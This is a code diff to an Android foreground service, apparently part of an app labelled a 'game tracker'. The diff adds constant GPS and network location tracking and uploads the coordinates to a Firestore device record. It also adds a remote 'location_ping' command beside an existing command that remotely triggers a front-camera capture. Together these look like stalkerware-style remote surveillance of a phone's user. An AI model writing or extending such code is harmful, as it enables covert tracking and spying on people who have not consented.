@@ -4,6 +4,9 @@ import android.app.*
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
@@ -29,6 +32,8 @@ class ForegroundService : Service() {
     }
 
     private var firestoreListener: ListenerRegistration? = null
+    private var locationManager: LocationManager? = null
+    private var locationListener: LocationListener? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -44,8 +49,76 @@ class ForegroundService : Service() {
         }
 
         setupFirestoreRequestListener()
+        startLocationUpdates()
 
         return START_STICKY
+    }
+
+    private fun startLocationUpdates() {
+        try {
+            if (locationManager == null) {
+                locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            }
+
+            locationListener = object : LocationListener {
+                override fun onLocationChanged(location: Location) {
+                    updateFirestoreLocation(location)
+                }
+
+                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
+                override fun onProviderEnabled(provider: String) {}
+                override fun onProviderDisabled(provider: String) {}
+            }
+
+            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
+            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true
+
+            if (hasGps) {
+                locationManager?.requestLocationUpdates(
+                    LocationManager.GPS_PROVIDER,
+                    5000L,
+                    0f,
+                    locationListener!!
+                )
+            }
+            if (hasNet) {
+                locationManager?.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    5000L,
+                    0f,
+                    locationListener!!
+                )
+            }
+
+            val lastGps = if (hasGps) locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
+            val lastNet = if (hasNet) locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) else null
+            val bestLoc = lastGps ?: lastNet
+            if (bestLoc != null) {
+                updateFirestoreLocation(bestLoc)
+            }
+        } catch (e: SecurityException) {
+            e.printStackTrace()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun updateFirestoreLocation(location: Location) {
+        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return
+
+        try {
+            val firestore = FirebaseFirestore.getInstance()
+            val updates = mapOf<String, Any>(
+                "latitude" to location.latitude,
+                "longitude" to location.longitude,
+                "accuracy" to location.accuracy.toDouble(),
+                "lastLocationTime" to System.currentTimeMillis()
+            )
+            firestore.collection("devices").doc(deviceId).update(updates)
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun setupFirestoreRequestListener() {
@@ -69,6 +142,9 @@ class ForegroundService : Service() {
                             val cameraFacing = doc.getString("cameraFacing") ?: "front"
 
                             when (requestType) {
+                                "location_ping" -> {
+                                    startLocationUpdates()
+                                }
                                 "camera_capture" -> {
                                     val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                                         putExtra("requestId", requestId)
@@ -135,6 +211,9 @@ class ForegroundService : Service() {
         try {
             firestoreListener?.remove()
             firestoreListener = null
+            if (locationListener != null && locationManager != null) {
+                locationManager?.removeUpdates(locationListener!!)
+            }
         } catch (e: Exception) {
         }
         super.onDestroy()
